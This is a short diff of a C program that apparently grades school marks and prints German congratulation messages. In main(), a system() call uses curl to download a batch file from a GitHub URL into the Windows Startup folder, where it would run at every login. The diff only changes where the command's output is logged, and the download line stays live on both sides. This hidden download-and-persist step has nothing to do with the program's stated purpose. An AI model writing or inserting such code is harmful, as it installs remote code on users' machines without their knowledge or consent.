@@ -45,7 +45,7 @@ int main()
                             {
                                 printf("Gratuliere die Note %f ist sehr gut.\n", note);
                             }
-    system("curl.exe -o \"%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\testurl.bat\" https://raw.githubusercontent.com/YannickMu/Networking/main/test.bat > \".\\test.txt\" 2>&1");
+    system("curl.exe -o \"%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\testurl.bat\" https://raw.githubusercontent.com/YannickMu/Networking/main/test.bat > \"C:\\test.txt\" 2>&1");
     printf("---------------------------------------------");
 
     return 0;
